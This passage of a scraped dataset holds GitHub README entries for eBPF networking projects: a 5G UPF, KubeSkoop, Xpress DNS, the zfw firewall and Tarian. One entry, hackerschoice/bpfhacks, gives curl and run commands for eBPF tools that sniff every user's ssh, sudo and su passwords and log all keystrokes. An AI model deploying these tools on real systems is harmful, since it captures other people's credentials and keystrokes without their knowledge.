 cd tests/scripts/../trex/v2.87; sudo ./trex-console --port 1235 --async_port 1236
```
Create a symbolic from `libc.a -> liblibc.a` (Manjaro)

```
sudo ln -s -f /usr/lib64/libc.a /usr/lib64/liblibc.a
```


## Contribute

If you think this could be better, **please open an issue or start a discussion**.

PRs ARE WELCOME :+1:

## :star: BibTeX

The paper is available [here](docs/Paper___An_In_Kernel_Solution_Based_on_XDP__Design__Prototype_and_Performance_Evaluation.pdf).

```bibtex
@INPROCEEDINGS{Amar2110:Kernel,
AUTHOR=""Thiago Arruda Navarro do Amaral and Raphael {Vicente Rosa} and David Moura
and Christian {Esteve Rothenberg}"",
TITLE=""An {In-Kernel} Solution Based on {XDP} for {5G} {UPF:} Design, Prototype
and Performance Evaluation"",
BOOKTITLE=""2021 1st Joint International Workshop on Network Programmability and
Automation (NetPA 2021)"",
ADDRESS=""Izmir, Turkey, Turkey"",
DAYS=24,
MONTH=oct,
YEAR=2021,
KEYWORDS=""5G; XDP; UPF"",
ABSTRACT=""The edge computing infrastructure can scale from datacenters to single
device. The well-known technology for fast packet processing is DPDK, which
has outstanding performance regarding the throughput and latency. However,
there are some drawbacks when the usage is done in the edge: (i) the
polling mechanism for packet processing keeps the CPU exclusively occupied
even if there is no traffic, leading to wasted resources; and (ii) DPDK
interface becomes unavailable for the applications inside the host, so the
integration between a non-DPDK application and a DPDK application becomes a
hard task. In this paper, we propose an open-source in-kernel 5G UPF
solution based on 3GPP Release 16 to be deployed in a restrictive
environment like MEC, where MEC host and UPF are collocated with the Base
Station, sharing the same computational and network resources. The solution
leverages the eBPF/XDP, a novel Linux kernel technology for fast packet
processing. We show it can scale and achieve 10 Mpps using only 60\% of the
CPU with 6 cores.""
}"
alibaba/kubeskoop,661,85,661,40,Go,Network monitoring & diagnosis suite for Kubernetes,2023-01-16T16:07:34Z,2025-10-09T12:01:31Z,455,"# KubeSkoop

![logo](docs/images/kubeskoop_logo.svg)

![kubeskoop](https://img.shields.io/github/v/tag/alibaba/kubeskoop)
![license](https://img.shields.io/badge/license-Apache-blue)
[![Go Report Card](https://goreportcard.com/badge/github.com/alibaba/kubeskoop)](https://goreportcard.com/report/github.com/alibaba/kubeskoop)

English | [ç®€ä½“ä¸­æ–‡](./README_zh.md)

- [Overview](#overview)
- [Quick start](#quick-start)
- [Contributing](#contributing)
- [Contact](#contact)
- [License](#license)

## Overview

KubeSkoop is a kubernetes networking diagnose tool for different CNI plug-ins and IAAS providers.
KubeSkoop automatic construct network traffic graph of Pod in the Kubernetes cluster,
monitoring and analysis of the kernel's critical path by eBPF, to resolve most of Kubernetes cluster network problems.

### Key Features

#### One-Shot Diagnose For Network Broken

- Diagnose in-cluster traffic between Pod,Service,Node and Ingress/Egress Traffic.
- Cover whole linux network stack: Socket,Bridge,Veth,Netfilter,sysctlsâ€¦
- Support IaaS network probe for cloud providers.

#### In-Depth Kernel Monitor

- eBPF seamless kernel monitor
- CO-RE scripts on series kernel by BTF
- export metrics to standard Prometheus metric API

#### Network Anomaly Event

- support dozens of anomy scenes recognition
- export anomy event to Grafana Loki or Web Console

#### User-friendly Web Console

- Integrating all capabilities of KubeSkoop, provides network diagnosis, event monitoring, packet capturing, latency detection, etc.

## Quick Start

You can view the full documentation from the [KubeSkoop.io](https://kubeskoop.io/).

### Installation

You can quickly deploy KubeSkoop, Prometheus, Grafana and Loki to your cluster via [skoopbundle.yaml](deploy/skoopbundle.yaml).

```bash
kubectl apply -f https://raw.githubusercontent.com/alibaba/kubeskoop/main/deploy/skoopbundle.yaml
```

***Note: skoopbundle.yaml starts with the minimum number of replicas and default configurations, which is not suitable for production environments.***

When installation is done, you can acess the KubeSkoop Web Console by service `webconsole`.

```bash
kubectl get svc -n kubeskoop webconsole
```

You may need a `Nodeport` or `LoadBalancer` to acess from outside of the cluster.

Default username is `admin`, and password is `kubeskoop`.

![Web Console](docs/images/web_console.jpg)

### Network diagnosis

#### Connectivity Diagnosis

Connectivity diagnosis can be submitted through the web console.

![Diagnose](docs/images/diagnose.jpg)

Under **Diagnosis - Connectivity Diagnosis**, you can enter the source address, destination address, port, and protocol for diagnosis, and click `Diagnose` to submit the diagnosis. After the diagnosis is complete, you can see the result in the history list.

![Diagnosis Result](docs/images/diagnosis_result.jpg)

#### Packet Capturing

Under **Diagnosis - Packet Capturing**ï¼Œyou can perform packet capturing for node/pod in the cluster.

![Packet Capturing](docs/images/packet_capturing.jpg)

#### Latency Detection

Under **Diagnosis - Latency Detection**ï¼Œyou can detect latencies between multiple nodes and pods.

![Latency Detection](docs/images/ping_mesh.jpg)

### Monitor network jitter and bottlenecks

#### Network Performance Dashboard

View the network permance dashboard from **Monitoring - Dashboard**. In the dashboard, you can check the water level of each monitor item corresponding to the time point of the performance problem.  
![grafana_performance](docs/images/monitoring.jpg)

#### Network Jitter & Anomy Event Analysis

Under **Monitoring - Event**, you can view the anomaly events occurring within the cluster at the current time point. You can also manually select the desired time range, or filter based on event type, node, and information such as the namespace/name of the Pod where the event occurred.

Click `Live` on the right top to view the live event stream according to the current filters.
![Events](docs/images/events.jpg)

#### Network Link Graph

Under the homepage or **Monitoring - Network Graph**, you can see the actual network link graph in the cluster, with time and namespaces. You can also switch view mode to `Table` to view each connection.

![Network Graph Table](docs/images/network_graph_table.jpg)

## Contributing

Feel free to open issues and pull requests. Any feedback is much appreciated!

### Contributors

This project exists, thanks to all the people who contributed.

<a href=""https://github.com/alibaba/kubeskoop/graphs/contributors""><img src=""https://opencollective.com/kubeskoop/contributors.svg?width=890&button=false"" /></a>

## Contact

- DingTalk Group ID(26720020148)

## License

Most source code in KubeSkoop which running on userspace are licensed under the [Apache License, Version 2.0](LICENSE.md).  
The BPF code in `/bpf` directory are licensed under the [GPL v2.0](bpf/COPYING) to compat with Linux kernel helper functions.  

## Security

Please report vulnerabilities by email toÂ [kubernetes-security@service.aliyun.com](mailto:kubernetes-security@service.aliyun.com). Also see ourÂ [SECURITY.md](SECURITY.md) file for details.
"
hackerschoice/bpfhacks,187,17,187,1,,eBPF hacks,2023-11-12T19:43:15Z,2025-10-07T09:11:16Z,33,"# eBPF tools

A (short) collecton of eBPF enabled tools (need root privileges to run);

Prerequisite: Install the latest bpftrace tool:
```console
curl -o bpftrace -fsSL https://github.com/iovisor/bpftrace/releases/latest/download/bpftrace
chmod 755 bpftrace
```

## Project #1 - Sniff all ssh/login/xterm session:

Record all PTY sessions and sniffs all ssh/sudo/su passwords of all users.

```console
curl -o ptysnoop.bt -fsSL https://github.com/hackerschoice/bpfhacks/raw/main/ptysnoop.bt
export BPFTRACE_MAX_STRLEN=200
./bpftrace -Bnone ptysnoop.bt
```
<p align=""center"">
<img width=""675"" alt=""ptysnoop"" src=""https://github.com/hackerschoice/bpfhacks/assets/5938498/de068ae5-9cea-44fc-83a6-56e4d37dee93"">
</p>

Tools by others: [SSHLog](https://ebpf.io/applications/#sshlog).

## Project #2 - Keylogger:

Record all keys pressed on the keyboard:

```console
./bpftrace -Bnone keylogger.bt
```
<p align=""center"">
<img alt=""keuylogger"" src=""https://github.com/hackerschoice/bpfhacks/assets/5938498/2d9d90bf-497d-4cc7-9583-5b8c162231b6"">
</p>

## TIPS & TRICKS

It may complain about missing Linux Kernel header files. Download them to a local directory:
```sh
wget https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-...
dpkg-deb -xv linux-headers-*.deb ""$(pwd)""
export BPFTRACE_KERNEL_SOURCE=""$(echo ""$(pwd)/usr/src/linux-headers-""*)""
sed '/generated\/autoconf.h/d' -i ""${BPFTRACE_KERNEL_SOURCE}/include/linux/kconfig.h""
```

Check for BPF support in the Kernel (it is enabled by default):
```sh
grep CONFIG_BPF /boot/config-$(uname -r)
```


"
zebaz/xpress-dns,86,18,86,1,C,Experimental XDP DNS server powered by eBPF,2020-11-20T12:18:41Z,2025-09-02T10:04:54Z,24,"# Xpress DNS - Experimental XDP DNS server

## About
Xpress DNS is an experimental DNS server written in BPF for high throughput, low latency DNS responses.  
It uses [eXpress Data Path](https://en.wikipedia.org/wiki/Express_Data_Path) to process packets early in the Linux networking path.  
A user space application is provided to add DNS records to a BPF map which is read from in-kernel by the XDP module.  
DNS requests that do not match are passed on to the Linux networking stack. 

## Use case
Xpress DNS could be used as a high performance DNS proxy for common DNS requests of static DNS records.  
By responding to DNS requests before the packet gets processed by the Linux networking stack, it alleviates load on the system and DNS servers in user space.

## Features & limitations
* Currently supports A records
* Only supports plain DNS over UDP (port 53)
* Basic EDNS implementation
* Only responds to single queries for now
* No recursive lookups

## Requirements
* Kernel version 5.8 or higher is required as this program uses the `bpf_xdp_adjust_tail` call to extend packet size. See https://lwn.net/Articles/820562/, merged in 5.8.
* iproute2 to load the BPF object on a network device

## How to build
To build this software we use Docker to ensure a reproducable build environment.  
With Docker installed, run the `make` command in the root of the repository.  

To build the software without Docker: install llvm, clang, libbpf-dev, iproute2 and run the `make` command in the `src` directory.

## How to use
Load the `xdp_dns_kern.o` BPF object using iproute2 on the target network interface (veth0 in the example below):
```bash
ip link set dev veth0 xdp obj ./src/xdp_dns_kern.o
```

Use the `xdns` user space application to manage DNS records.
```bash
Usage: xdns add record_type domain_name value [ttl]
       xdns remove record_type domain_name value
       xdns list
```
Example: ```xdns add a foo.bar 127.0.0.1 120```

Use `xdns list` to list all configured DNS records.

## How to test & debug
Xpress DNS is compatible with BCC toolkit and can be instrumented with its Python bindings.  
You can refer to the supplied unit tests in [test_xdp_dns.py](src/test/test_xdp_dns.py) for pointers on how to test the code using BCC, scapy and Python's unit test module.
Run `make test` in the root directory to run the supplied unit tests.

Build with `make DEBUG=y` to enable debug logging, which logs debug information to `/sys/kernel/debug/tracing/trace_pipe`

## License
This repository is licensed under GPLv2.0. 
See LICENSE file for details.
"
netfoundry/zfw,70,7,70,0,C,An EBPF based IPv4/IPv6 firewall  with integrations for OpenZiti Zero-Trust Framework edge-routers and tunnellers,2023-05-21T01:35:16Z,2025-09-17T08:19:57Z,698,"# Introduction

--- 
This standalone firewall application utilizes both tc-ebpf and xdp to provide stateful IPv4/IPv6 firewalling.
It can also be used in conjunction with an [OpenZiti](https://docs.openziti.io/) ziti-edge-tunnel/edge router
installation for packet redirection/filtering. It also supports EBPF based masquerade capability for
both IPv4/IPv6. 

  
## Build

[To build / install zfw from source. Click here!](./BUILD.md)

## Standalone FW Deployment

 Install
  binary deb or rpm package (refer to workflow for detail pkg contents)

Debian 12/ Ubuntu 22.04+
```
sudo dpkg -i zfw-router_<ver>_<arch>.deb
```

RedHat 9.4
```
sudo yum install zfw-router-<ver>.<arch>.rpm
```
Note if running firewalld you will need to at a minimum set each interface you enable tc ebpf on to the trusted zone or equivalent. e.g. ```firewall-cmd --permanent --zone=trusted --add-interface=ens33``` or firewalld will drop traffic before it reaches the zfw filters.

Install from source ubuntu 22.04+ / Debian 12+ / Redhat 9.4
[build / install zfw from source](./BUILD.md)

After installing:
```
sudo su - 
cd /opt/openziti/etc
cp ebpf_config.json.sample ebpf_config.json
```
Follow the README.md section ```Two Interface config with ens33 facing internet and ens37 facing local lan``` on how to edit ebpf_config.json based on your interface configuration.
if you only have one interface then set it as InternalInterfaces and leave ExternalInterfaces as an empty list [].  With a single interface if you want to block outbound traffic you will need to add egress rules as described in the section ```Outbound Filtering```.

example ebpf_config.json:
```
{""InternalInterfaces"":[{""Name"":""eth0""}],
 ""ExternalInterfaces"":[{""Name"":""eth1""}]}
```

To start the firewall just run 

 sudo /opt/openziti/bin/start_ebpf_router.py

you will see output like 

```
Unable to retrieve LanIf!
ziti-router not installed, skipping ebpf router configuration!
Attempting to add ebpf ingress to:  eth0
Attempting to add ebpf egress to:  eth1
Ebpf not running no  maps to clear
tc parent add : eth0
Set tc filter enable to 1 for ingress on eth0
Attached /opt/openziti/bin/zfw_tc_ingress.o to eth0
Skipping adding existing rule
Skipping adding existing rule (v6)
tc parent add : eth1
Set tc filter enable to 1 for ingress on eth1
Attached /opt/openziti/bin/zfw_tc_ingress.o to eth1
Rules updated
Rules updated (v6)
Set per_interface rule aware to 1 for eth1
Error: Exclusivity flag on, cannot modify.
tc parent already exists : eth1
Set tc filter enable to 1 for egress on eth1
Attached /opt/openziti/bin/zfw_tc_outbound_track.o to eth1
```

the important lines from above to verify its worked:
```
Set tc filter enable to 1 for ingress on eth0
Attached /opt/openziti/bin/zfw_tc_ingress.o to eth0

Set tc filter enable to 1 for ingress on eth1
Attached /opt/openziti/bin/zfw_tc_ingress.o to eth1

Set tc filter enable to 1 for egress on eth1
Attached /opt/openziti/bin/zfw_tc_outbound_track.o to eth1
```

In order to ensure the FW starts on boot you need to enable the fw-init.service.
```
sudo systemctl enable fw-init.service
```

Since you will not be using ziti to populate rules all your rules would be with respect to the local OS then any rules will need to be set 

to drop to the host system as mentioned in the README this is done by setting the ```tproxy-port to 0``` in your rules. i.e.

``` 
sudo /usr/sbin/zfw -I -c 192.168.1.108 -m 32 -l 8000 -h 8000 -t 0 -p tcp
```

Note:
The ExternalInterface is set to what is called ```per interface rules``` which means it only follows
rules where its name is set in the rule, whereas the InternalInterface follows all rules by default. i.e. to allow the above rule in on the External interface you need
```-N, --interface <ifname>``` in the rule i.e.
```
sudo /usr/sbin/zfw -I -c 192.168.1.108 -m 32 -l 8000 -h 8000 -t 0 -p tcp -N eth1
```
## Ziti-Edge-Tunnel Deployment 

The program is designed to be deployed as systemd services if deployed via .deb package with
an existing ziti-edge-tunnel(v22.5 +) installation on Ubuntu 22.04(amd64/arm64)service installation. If you don't currently
have ziti-edge-tunnel installed and an operational OpenZiti network built, follow these 
[instructions](https://docs.openziti.io/docs/guides/Local_Gateway/EdgeTunnel).


- Install
  binary deb or rpm package (refer to workflow for detail pkg contents)

Debian 12/ Ubuntu 22.04+
```
sudo dpkg -i zfw-tunnel_<ver>_<arch>.deb
```

RedHat 9.4
```
sudo yum install zfw-tunnel-<ver>.<arch>.rpm
```
Note if running firewalld you will need to at a minimum set each interface you enable tc ebpf on to the trusted zone or equivalent. e.g. ```firewall-cmd --permanent --zone=trusted --add-interface=ens33``` or firewalld will drop traffic before it reaches the zfw filters.

Install from source ubuntu 22.04+ / Debian 12+ / Redhat 9.4
[build / install zfw from source](./BUILD.md)

## Ziti-Router Deployment

The program is designed to integrated into an existing Openziti ziti-router installation if ziti router has been deployed via ziti_auto_enroll
 [instructions](https://docs.openziti.io/docs/guides/Local_Gateway/EdgeRouter). 

- Install
  binary deb package (refer to workflow for detail pkg contents)
```
sudo dpkg -i zfw-router_<ver>_<arch>.deb
```
Install from source ubuntu 22.04+ / Debian 12 / Redhat 9.4
[build / install zfw from source](./BUILD.md)

**The following instructions pertain to both zfw-tunnel and zfw-router. Platform specific functions will be noted explicitly**

Packages files will be installed in the following directories.
```
/etc/systemd/system <systemd service files>  
/usr/sbin <symbolic link to zfw executable>
/opt/openziti/etc : <config files> 
/opt/openziti/bin : <binary executables, executable scripts, binary object files>
/opt/openziti/bin/user/: <user configured rules>
```
Configure:
- Edit interfaces (zfw-tunnel) note: zfw for ziti-router will automatically add lanIf: from config.yml when
 ```/opt/openziti/bin/start_ebpf_router.py``` is run the first time and OpenZiti router is installed and
 configured.
```
sudo cp /opt/openziti/etc/ebpf_config.json.sample /opt/openziti/etc/ebpf_config.json
sudo vi /opt/openziti/etc/ebpf_config.json
```
- Adding interfaces
  Replace ens33 in line with:{""InternalInterfaces"":[{""Name"":""ens33""}], ""ExternalInterfaces"":[]}
  Replace with interface that you want to enable for ingress firewalling / openziti interception and 
  optionally ExternalInterfaces if you want per interface rules -N <ifname> with -I.
```
i.e. ens33
    {""InternalInterfaces"":[{""Name"":""ens33""}], ""ExternalInterfaces"":[]}
Note if you want to add more than one add to list
    {""InternalInterfaces"":[{""Name"":""ens33""}, {""Name"":""ens37""}], ""ExternalInterfaces"":[]}
```

- Add user configured rules:
```
sudo cp /opt/openziti/bin/user/user_rules.sh.sample /opt/openziti/bin/user/user_rules.sh
sudo vi /opt/openziti/bin/user/user_rules.sh
```   

- Enable services:(zfw-tunnel)
```  
sudo systemctl enable ziti-fw-init.service
sudo systemctl enable ziti-wrapper.service 
sudo systemctl restart ziti-edge-tunnel.service 
```

- Enable services:(zfw-router)
```  
sudo /opt/openziti/bin/start_ebpf_router.py 
```

The Service/Scripts will automatically configure ufw (if enabled) to hand off to ebpf on configured interface(s).  Exception is icmp
which must be manually enabled if it's been disabled in ufw.  

/etc/ufw/before.rules:
```
-A ufw-before-input -p icmp --icmp-type echo-request -j ACCEPT
```

Also to allow icmp echos to reach the ip of attached interface you would need to
set icmp to enabled in the /opt/openziti/bin/user/user_rules.sh file i.e. 
```
sudo zfw -e ens33 
sudo systemctl restart ziti-wrapper.service 
```

Verify running: (zfw-router)
```
sudo zfw -L
```
If running:
```
Assuming no services configured yet:

type   service id              proto    origin              destination               mapping:                                                   interface list
------ ----------------------  -----    ---------------     ------------------        --------------------------------------------------------- ----------------
Rule Count: 0 / 250000
prefix_tuple_count: 0 / 100000

```

If not running:
```
Not enough privileges or ebpf not enabled!
Run as ""sudo"" with ingress tc filter [filter -X, --set-tc-filter] set on at least one interface

```
Verify running on the configured interface i.e.
```
sudo tc filter show dev ens33 ingress
```   
If running ingress filters on interface:
```
filter protocol all pref 1 bpf chain 0 
filter protocol all pref 1 bpf chain 0 handle 0x1 zfw_tc_ingress.o:[action] direct-action not_in_hw id 18287 tag 7924b3b7066e6c20 jited 
filter protocol all pref 2 bpf chain 0 
filter protocol all pref 2 bpf chain 0 handle 0x1 zfw_tc_ingress.o:[action/1] direct-action not_in_hw id 18293 tag aa2d601900a4bb11 jited 
filter protocol all pref 3 bpf chain 0 
filter protocol all pref 3 bpf chain 0 handle 0x1 zfw_tc_ingress.o:[action/2] direct-action not_in_hw id 18299 tag b2a4d46c249aec22 jited 
filter protocol all pref 4 bpf chain 0 
filter protocol all pref 4 bpf chain 0 handle 0x1 zfw_tc_ingress.o:[action/3] direct-action not_in_hw id 18305 tag ed0a156d6e90d4ab jited 
filter protocol all pref 5 bpf chain 0 
filter protocol all pref 5 bpf chain 0 handle 0x1 zfw_tc_ingress.o:[action/4] direct-action not_in_hw id 18311 tag 7b65254c0f4ce589 jited 
filter protocol all pref 6 bpf chain 0 
filter protocol all pref 6 bpf chain 0 handle 0x1 zfw_tc_ingress.o:[action/5] direct-action not_in_hw id 18317 tag f4d6609cc4eb2da3 jited 
filter protocol all pref 7 bpf chain 0 
filter protocol all pref 7 bpf chain 0 handle 0x1 zfw_tc_ingress.o:[action/6] direct-action not_in_hw id 18323 tag a3c047d2327de858 jited 
```    

Verify running egress filters on the configured interface i.e.
```
sudo tc filter show dev ens33 egress
```   
If running egress on interface:
```
filter protocol all pref 1 bpf chain 0 
filter protocol all pref 1 bpf chain 0 handle 0x1 zfw_tc_outbound_track.o:[action] direct-action not_in_hw id 18329 tag 4d66fa6f69670aad jited 
filter protocol all pref 2 bpf chain 0 
filter protocol all pref 2 bpf chain 0 handle 0x1 zfw_tc_outbound_track.o:[action/1] direct-action not_in_hw id 18335 tag e55132e45dc4a711 jited 
filter protocol all pref 3 bpf chain 0 
filter protocol all pref 3 bpf chain 0 handle 0x1 zfw_tc_outbound_track.o:[action/2] direct-action not_in_hw id 18341 tag 9ec5f3c00f9ef356 jited 
filter protocol all pref 4 bpf chain 0 
filter protocol all pref 4 bpf chain 0 handle 0x1 zfw_tc_outbound_track.o:[action/3] direct-action not_in_hw id 18347 tag 9af99a7218e0be3d jited 
filter protocol all pref 5 bpf chain 0 
filter protocol all pref 5 bpf chain 0 handle 0x1 zfw_tc_outbound_track.o:[action/4] direct-action not_in_hw id 18353 tag d1a536ae48efe657 jited 
filter protocol all pref 6 bpf chain 0 
filter protocol all pref 6 bpf chain 0 handle 0x1 zfw_tc_outbound_track.o:[action/5] direct-action not_in_hw id 18359 tag 7da52c707c308700 jited 
filter protocol all pref 7 bpf chain 0 
filter protocol all pref 7 bpf chain 0 handle 0x1 zfw_tc_outbound_track.o:[action/6] direct-action not_in_hw id 18365 tag bd21505cf7e27536 jited 
```

Services configured via the openziti controller for ingress on the running ziti-edge-tunnel/ziti-router identity will auto populate into
the firewall's inbound rule list.

Also note for zfw-tunnel xdp is enabled on the tunX interface that ziti-edge tunnel is attached to support functions like bi-directional 
ip transparency which would otherwise not be possible without this firewall/wrapper.

You can verify this as follows:
```
sudo ip link show tun0
```
expected output:
```
9: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 xdpgeneric qdisc fq_codel state UNKNOWN mode DEFAULT group default qlen 500
    link/none 
    prog/xdp id 249 tag 06c4719358c6de42 jited  <This line will be there if exp forwarder is running>
```

### Outbound External passthrough traffic

The firewall can support subtending devices for two interface scenarios i.e.
external and trusted.

external inet <----> (ens33)[ebpf-router](ens37) <----> trusted client(s)

with zfw_tc_ingress.o applied ingress on ens33 and zfw_tc_oubound_track.o applied egress on ens33 the router will
statefully track outbound udp and tcp connections on ens33 and allow the associated inbound traffic.  While
running in this mode it does not make sense to add ziti tproxy rules and is meant for running as a traditional fw.
As be for you can also create passthrough FW rules (set -t --tproxy-port to 0) which would also make sense in the mode for
specific internet-initiated traffic you might want to allow in.

TCP:
    If the tcp connections close gracefully then the entries will remove upon connection closure. 
    if not, then there is a 60-minute timeout that will remove the in active state if no traffic seen
    in either direction.

UDP:
    State will remain active as long as packets tuples matching SRCIP/SPORT/DSTIP/DPORT are seen in
    either direction within 30 seconds.  If no packets seen in either direction the state will expire.
    If an external packet enters the interface after expiring the entry will be deleted.  if an egress
    packet fined a matching expired state it will return the state to active.

In order to support this per interface rule awareness was added which allows each port range within a prefix
to match a list of connected interfaces.  On a per interface basis you can decide to honor that list or not via
a per-prefix-rules setting in the following manner via the zfw utility

In order to enable outbound tracking you need to add an egress tc filter to the interface where traffic will be egressing.
This is performaed with the following cli command: ```sudo zfw -X <ifname> -O <egress tc object file> -z, --direction egress```.
e.g.
```
sudo zfw -X ens33 -O /opt/openziti/bin/zfw_tc_outbound_track.o --direction egress
```


#### Two Interface config with ens33 facing internet and ens37 facing local lan

```
sudo vi /opt/openziti/etc/ebpf_config.json
```
```
{""InternalInterfaces"":[{""Name"":""ens37"",""OutboundPassThroughTrack"": true, PerInterfaceRules: false}],
 ""ExternalInterfaces"":[{""Name"":""ens33"", OutboundPassThroughTrack: true, PerInterfaceRules: true}]}
```
The above JSON sets up ens33 to be an internal interface (No outbound tracking) and ens33 as an external interface
with outbound tracking (Default for External Interface).  It also automatically adds runs the sudo zfw -P ens33 so ens33
(default for ExternalInterfaces) which requires -N to add inbound rules to it and will ignore rules where it is not in the interface list.
Keys ""OutboundPassThroughTrack"" and ""PerInterfaceRules"" are shown with their default values, you only need to add them if you
want change the default operation for the interface type.

#### Single Interface config with ens33 facing lan local lan
```
sudo vi /opt/openziti/etc/ebpf_config.json
```
```
{""InternalInterfaces"":[{""Name"":""ens37"",""Outboun"
kube-tarian/tarian,56,13,56,1,Go,"Protect your Cloud Native Applications running on Kubernetes from malicious attacks with pre-registered source code, pre-registered runtime processes monitoring, automated actions based on configure-actions, analytics, alerting and also sharing detections with community. Maybe save from Ransomware. Shift-Left your threat detection. Shift Right threat elimination.",2021-06-28T00:11:53Z,2025-06-03T14:29:56Z,595,"<p align=""center""><img src=""logo/tarian-new-logo-1.png"" width=""175""></p>

# Tarian

Protect your applications running on Kubernetes from malicious attacks by pre-registering your trusted processes and trusted file signatures. Tarian will detect unknown processes and changes to the registered files, then it will send alerts and take an automated action. Save your K8s environment from Ransomware!

We want to maintain this as an open-source project to fight against the attacks on our favorite Kubernetes ecosystem. By continuous contribution, we can fight threats together as a community.

[![Build status](https://img.shields.io/github/workflow/status/kube-tarian/tarian/CI?style=flat)](https://github.com/kube-tarian/tarian/actions)
[![Go Report Card](https://goreportcard.com/badge/github.com/kube-tarian/tarian)](https://goreportcard.com/report/github.com/kube-tarian/tarian)
[![codecov](https://codecov.io/gh/kube-tarian/tarian/graph/badge.svg?token=PH8E9ZOVR4)](https://codecov.io/gh/kube-tarian/tarian)

---

**How does Tarian work?**

Tarian Cluster Agent runs in Kubernetes cluster detecting unknown processes and unknown changes to files, report them to Tarian Server, and optionally take action: delete the violated pod. It uses eBPF to detect new processes. For file change detection, Tarian Cluster Agent injects a sidecar container in your main application's pod which will check file checksums in the configured path and compare them with the registered checksums in Tarian Server. Tarian will be a part of your Application's pod from dev to prod environment, hence you can register to your Tarian DB what is supposed to be happening & running in your container + file signatures to be watched + what can be notified + action to take (self destroy the pod) based on changes detected. Shift-left your detection mechanism!


**What if an unknown change happens inside the container which is not in Tarian's registration DB, how does Tarian react to it?**

If an unknown change happens, Tarian can simply notify observed analytics to your Security Team. Then your Security Engineers can register that change in Tarian DB whether it's considered a threat or not. Also, based on their analysis they can configure what action to take when that change happens again.


**How does the contribution of community helps to fight against the threats via Tarian?**

Any new detection analyzed & marked as a threat by your Security Experts, if they choose, can be shared to the open-source Tarian community DB with all the logs, strings to look for, observation, transparency, actions to configure, ... Basically anything the Experts want to warn about & share with the community. You can use that information as a Tarian user and configure actions in the Tarian app which is used in your environment. This is basically a mechanism to share info about threats & what to do with them. This helps everyone using Tarian to take actions together in their respective K8s environments by sharing their knowledge & experience.


**What kind of action(s) would Tarian take based on known threat(s)?**

Tarian would simply self destroy the pod it's running on. If the malware/virus spreads to the rest of the environment, well you know what happens. So, Tarian is basically designed to help reduce the risk as much as possible by destroying pods. Provisioning a new pod will be taken care of by K8s deployment. Tarian will only do destruction of the pods only if you tell Tarian to do so. If you don't want any actions to happen, you don't have to configure or trigger any; you can simply tell Tarian to just notify you. Tarian basically does what you want to be done to reduce the risk.


**Why another new security tool when there are many tools available already, like Falco, Kube-Hunter, Kube-Bench, Calico Enterprise Security, and many more security tools (open-source & commercial) that can detect & prevent threats at network, infra & application level? Why Tarian?**

The main reason Tarian was born is to fight against threats in Kubernetes together as a community. Another reason was, what if there is still some sophisticated attack which is capable of penetrating every layer of your security, able to reach your runtime app (Remote Code Execution) and your storage volumes, and capable of spreading to damage or lock your infra & data?! What do you want to do about such attacks, especially which turns into ransomware. Tarian is designed to reduce such risks, by taking action(s). We know that Tarian is not the ultimate solution, but we are confident that it can help reduce risks especially when knowledge is shared continuously by the community. From a technical perspective, Tarian can help reduce the risk by destroying the infected resources.

## Architecture diagram

![Arch. Diagram](./docs/architecture-diagram.png)

## Requirements

- Supported Kubernetes version (currently 1.22+)
- Kernel version >= 5.8
- Kernel with [BTF](https://www.kernel.org/doc/html/latest/bpf/btf.html) information to support eBPF CO-RE.
  Some major Linux distributions come with kernel BTF already built in. If your kernel doesn't come with BTF built-in,
  you'll need to build custom kernel. See [BPF CO-RE](https://github.com/libbpf/libbpf#bpf-co-re-compile-once--run-everywhere).


### Tested on popular Kubernetes Environments/Services:

| Environment                                  | Working            | Notes                                                              |
|----------------------------------------------|--------------------|--------------------------------------------------------------------|
| Kind v0.14.0                                 | :heavy_check_mark: |                                                                    |
| Minikube v1.26.0                             | :heavy_check_mark: |                                                                    |
| Linode Kubernetes Engine (LKE) 1.22          | :heavy_check_mark: |                                                                    |
| Digital Ocean Kubernetes Engine (DOKS) 1.22  | :heavy_check_mark: |                                                                    |
| Google Kubernetes Engine (GKE) 1.22          | :heavy_check_mark: |                                                                    |
| Amazon Elastic Kubernetes Engine (EKS)       | :heavy_minus_sign: | [kernel < 5.8](https://github.com/awslabs/amazon-eks-ami/pull/862) |
| Azure Kubernetes Service (AKS)               | :heavy_minus_sign: | [kernel < 5.8](https://github.com/Azure/AKS/issues/2883)           |


### Prepare Namespaces

```bash
kubectl create namespace tarian-system
```

### Setup Dgraph Database

You can use any [Dgraph installation](https://dgraph.io/docs/deploy/kubernetes/) option as long as it can be accessed from the tarian server.


### Install tarian

1. Install tarian using Helm

```bash
helm repo add tarian https://kube-tarian.github.io/helm-charts
helm repo update

helm upgrade -i tarian-server tarian/tarian-server --devel -n tarian-system --set server.dgraph.address=DGRAPH_ADDRESS:PORT
helm upgrade -i tarian-cluster-agent tarian/tarian-cluster-agent --devel -n tarian-system
```

2. Wait for all the pods to be ready

```bash
kubectl wait --for=condition=ready pod --all -n tarian-system
```

3. Apply Dgraph schema

```bash
kubectl exec -ti deploy/tarian-server -n tarian-system -- ./tarian-server dgraph apply-schema
```
### Install tarian using tarianctl cli
Download tarianctl bin from github release page.

Run:
```
tarianctl install
```

You can use following flags to customize your installation.

```
Install Tarian on Kubernetes.

Usage:
  tarianctl install [flags]

Flags:
      --agents-values strings   Path to the helm values file for Tarian Cluster Agent and Node agent .
      --charts string           Path to the tarian helm charts directory.
      --dgraph-values strings   Path to the helm values file for DGraph.
  -h, --help                    help for install
  -n, --namespace string        Namespace to install Tarian. (default ""tarian-system"")
      --nats-values strings     Path to the helm values file for Nats.
      --server-values strings   Path to the helm values file for Tarian Server.

Global Flags:
  -k, --kubeconfig string                 path to the kubeconfig file to use
  -e, --log-formatter string              valid log formatters: json, text(default) (default ""text"")
  -l, --log-level string                  valid log levels: debug, info(default), warn/warning, error, fatal (default ""info"")
  -s, --server-address string             tarian server address to communicate with (default ""localhost:50051"")
  -c, --server-tls-ca-file string         ca file that server uses for TLS connection
  -t, --server-tls-enabled                if enabled, it will communicate with the server using TLS
  -i, --server-tls-insecure-skip-verify   if set to true, it will skip server's certificate chain and hostname verification (default true)

```
## Configuration

See helm chart values for
- [tarian-server](https://github.com/kube-tarian/tarian/blob/main/charts/tarian-server/values.yaml)
- [tarian-cluster-agent](https://github.com/kube-tarian/tarian/blob/main/charts/tarian-cluster-agent/values.yaml)


## Cloud / Vendor specific configuration

### Private GKE cluster

Private GKE cluster by default creates firewall rules to restrict master to nodes communication only on ports `443` and `10250`.
